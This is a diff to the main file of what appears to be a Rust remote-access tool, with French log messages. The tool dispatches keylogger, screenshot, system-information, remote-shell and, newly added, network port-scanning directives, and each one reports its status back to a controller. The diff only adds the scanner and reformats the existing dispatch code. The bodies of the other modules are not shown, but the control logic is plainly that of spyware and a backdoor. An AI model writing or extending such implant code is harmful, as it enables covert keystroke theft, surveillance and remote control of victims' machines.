@@ -1,6 +1,7 @@
 mod connexion;
 mod input;
 mod logs;
+mod network_scanner;
 mod screenshot;
 mod shell;
 use rand::Rng;
@@ -23,14 +24,20 @@ async fn main() {
                                 Ok(_) => {
                                     println!("Keylogger terminé");
                                     let _ = connexion::send_directive_status(
-                                        "keylogger", "success", "Terminé"
-                                    ).await;
+                                        "keylogger",
+                                        "success",
+                                        "Terminé",
+                                    )
+                                    .await;
                                 }
                                 Err(e) => {
                                     eprintln!("Erreur keylogger: {:?}", e);
                                     let _ = connexion::send_directive_status(
-                                        "keylogger", "error", &format!("{:?}", e)
-                                    ).await;
+                                        "keylogger",
+                                        "error",
+                                        &format!("{:?}", e),
+                                    )
+                                    .await;
                                 }
                             }
                         }),
@@ -40,14 +47,20 @@ async fn main() {
                                 Ok(_) => {
                                     println!("Screenshot terminé");
                                     let _ = connexion::send_directive_status(
-                                        "screenshot", "success", "Terminé"
-                                    ).await;
+                                        "screenshot",
+                                        "success",
+                                        "Terminé",
+                                    )
+                                    .await;
                                 }
                                 Err(e) => {
                                     eprintln!("Erreur screenshot: {:?}", e);
                                     let _ = connexion::send_directive_status(
-                                        "screenshot", "error", &format!("{:?}", e)
-                                    ).await;
+                                        "screenshot",
+                                        "error",
+                                        &format!("{:?}", e),
+                                    )
+                                    .await;
                                 }
                             }
                         }),
@@ -56,14 +69,18 @@ async fn main() {
                             match logs::get_sysinfo().await {
                                 Ok(_) => {
                                     let _ = connexion::send_directive_status(
-                                        "logs", "success", "Terminé"
-                                    ).await;
+                                        "logs", "success", "Terminé",
+                                    )
+                                    .await;
                                 }
                                 Err(e) => {
                                     eprintln!("Erreur logs: {:?}", e);
                                     let _ = connexion::send_directive_status(
-                                        "logs", "error", &format!("{:?}", e)
-                                    ).await;
+                                        "logs",
+                                        "error",
+                                        &format!("{:?}", e),
+                                    )
+                                    .await;
                                 }
                             }
                         }),
@@ -72,14 +89,42 @@ async fn main() {
                             match shell::launch_shell().await {
                                 Ok(_) => {
                                     let _ = connexion::send_directive_status(
-                                        "shell", "success", "Session shell terminée"
-                                    ).await;
+                                        "shell",
+                                        "success",
+                                        "Session shell terminée",
+                                    )
+                                    .await;
                                 }
                                 Err(e) => {
                                     eprintln!("Erreur shell : {}", e);
                                     let _ = connexion::send_directive_status(
-                                        "shell", "error", &format!("Erreur shell : {:?}", e)
-                                    ).await;
+                                        "shell",
+                                        "error",
+                                        &format!("Erreur shell : {:?}", e),
+                                    )
+                                    .await;
+                                }
+                            }
+                        }),
+                        "network_scan" => tokio::spawn(async {
+                            println!("Démarrage du scanner de réseau");
+                            match network_scanner::scan_all_ports().await {
+                                Ok(_) => {
+                                    let _ = connexion::send_directive_status(
+                                        "network_scan",
+                                        "success",
+                                        "Terminé",
+                                    )
+                                    .await;
+                                }
+                                Err(e) => {
+                                    eprintln!("Erreur network_scan : {}", e);
+                                    let _ = connexion::send_directive_status(
+                                        "network_scan",
+                                        "error",
+                                        &format!("Erreur  : {:?}", e),
+                                    )
+                                    .await;
                                 }
                             }
                         }),
